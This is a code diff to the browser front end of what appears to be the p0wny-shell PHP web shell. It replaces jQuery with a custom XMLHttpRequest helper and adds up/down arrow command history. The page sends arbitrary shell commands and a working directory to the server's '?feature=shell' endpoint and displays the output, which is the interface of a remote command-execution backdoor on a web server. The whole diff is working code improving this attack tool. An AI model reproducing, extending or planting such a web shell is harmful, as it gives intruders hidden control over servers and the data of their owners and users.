@@ -116,17 +116,18 @@ if (isset($_GET["feature"])) {
             }
         </style>
 
-        <script src="https://code.jquery.com/jquery-3.1.1.min.js" integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8=" crossorigin="anonymous"></script>
-
         <script>
             var CWD = null;
+            var commandHistory = [];
+            var historyPosition = 0;
+            var eShellCmdInput = null;
+            var eShellContent = null;
 
             function featureShell(command) {
-                var eShellContent = document.getElementById("shell-content");
 
                 function _insertCommand(command) {
                     eShellContent.innerHTML += "\n\n";
-                    eShellContent.innerHTML += `<span class=\"shell-prompt\">${genPrompt(CWD)}</span> `;
+                    eShellContent.innerHTML += '<span class=\"shell-prompt\">' + genPrompt(CWD) + '</span> ';
                     eShellContent.innerHTML += escapeHtml(command);
                     eShellContent.innerHTML += "\n";
                     eShellContent.scrollTop = eShellContent.scrollHeight;
@@ -138,10 +139,10 @@ if (isset($_GET["feature"])) {
                 }
 
                 _insertCommand(command);
-                return $.post("?feature=shell", {cmd: command, cwd: CWD}, "json")
-                    .then(response => _insertStdout(response.stdout.join("\n")) || response)
-                    .then(response => updateCwd(response.cwd) || response)
-                    .fail(error => _insertStdout("AJAX ERROR: " + JSON.stringify(error)));
+                makeRequest('?feature=shell', {cmd: command, cwd: CWD}, function(response) {
+                    _insertStdout(response.stdout.join("\n"));
+                    updateCwd(response.cwd);
+                });
             }
 
             function genPrompt(cwd) {
@@ -149,9 +150,9 @@ if (isset($_GET["feature"])) {
                 var shortCwd = cwd;
                 if (cwd.split("/").length > 3) {
                     var splittedCwd = cwd.split("/");
-                    shortCwd = `…/${splittedCwd[splittedCwd.length-2]}/${splittedCwd[splittedCwd.length-1]}`;
+                    shortCwd = '…/' + splittedCwd[splittedCwd.length-2] + '/' + splittedCwd[splittedCwd.length-1];
                 }
-                return `p0wny@shell:<span title="${cwd}">${shortCwd}</span>#`
+                return 'p0wny@shell:<span title="' + cwd + '">' + shortCwd + '</span>#';
             }
 
             function updateCwd(cwd) {
@@ -160,10 +161,10 @@ if (isset($_GET["feature"])) {
                     _updatePrompt();
                     return;
                 }
-                return $.post("?feature=pwd", {}, "json")
-                    .then(response => CWD = (response.cwd) || response)
-                    .then(response => _updatePrompt() || response)
-                    .fail(error => console.error(error));
+                makeRequest('?feature=pwd', {}, function(response) {
+                    CWD = response.cwd;
+                    _updatePrompt();
+                });
 
             }
 
@@ -180,15 +181,72 @@ if (isset($_GET["feature"])) {
             }
 
             function _onShellCmdKeyDown(event) {
-                var eShellCmdInput = document.getElementById("shell-cmd");
-                if (event.key == "Enter") {
-                    featureShell(eShellCmdInput.value);
-                    eShellCmdInput.value = "";
+                switch (event.key) {
+                    case 'Enter':
+                        featureShell(eShellCmdInput.value);
+                        insertToHistory(eShellCmdInput.value);
+                        eShellCmdInput.value = "";
+                        break;
+                    case 'ArrowUp':
+                        if (historyPosition > 0) {
+                            historyPosition--;
+                            eShellCmdInput.blur();
+                            eShellCmdInput.focus();
+                            eShellCmdInput.value = commandHistory[historyPosition];
+                        }
+                        break;
+                    case 'ArrowDown':
+                        if (historyPosition >= commandHistory.length) {
+                            break;
+                        }
+                        historyPosition++;
+                        if (historyPosition === commandHistory.length) {
+                            eShellCmdInput.value = "";
+                        } else {
+                            eShellCmdInput.blur();
+                            eShellCmdInput.focus();
+                            eShellCmdInput.value = commandHistory[historyPosition];
+                        }
+                        break;
                 }
             }
 
+            function insertToHistory(cmd) {
+                commandHistory.push(cmd);
+                historyPosition = commandHistory.length;
+            }
+
+            function makeRequest(url, params, callback) {
+                function getQueryString() {
+                    var a = [];
+                    for (var key in params) {
+                        if (params.hasOwnProperty(key)) {
+                            a.push(encodeURIComponent(key) + '=' + encodeURIComponent(params[key]));
+                        }
+                    }
+                    return a.join('&');
+                }
+                var xhr = new XMLHttpRequest();
+                xhr.open('POST', url, true);
+                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState === 4 && xhr.status === 200) {
+                        try {
+                            var responseJson = JSON.parse(xhr.responseText);
+                            callback(responseJson);
+                        } catch (err) {
+                            alert('Error while parsing response: ' + err);
+                        }
+                    }
+                };
+                xhr.send(getQueryString());
+            }
+
             window.onload = function() {
+                eShellCmdInput = document.getElementById("shell-cmd");
+                eShellContent = document.getElementById("shell-content");
                 updateCwd();
+                eShellCmdInput.focus();
             };
         </script>
     </head>
